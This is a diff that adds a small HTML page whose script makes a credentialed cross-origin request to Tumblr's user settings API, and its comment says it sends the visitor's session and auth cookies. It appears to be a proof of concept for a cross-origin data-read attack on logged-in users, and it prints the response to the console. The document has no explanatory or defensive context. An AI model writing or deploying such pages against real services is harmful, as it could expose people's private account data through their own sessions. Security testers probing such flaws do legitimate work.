@@ -1,0 +1,17 @@
+<html>
+  <head>
+    <meta name="referrer" content="no-referrer">
+  </head>
+  <body>
+    <script>
+      fetch("https://www.tumblr.com/api/v2/user/settings", {
+        method: "GET",
+        credentials: "include", // Important: send cookies (session, auth cookies)
+        mode: "cors" // Allow CORS request
+      })
+      .then(response => response.text())
+      .then(text => console.log("Response:", text))
+      .catch(error => console.error("Error:", error));
+    </script>
+  </body>
+</html>
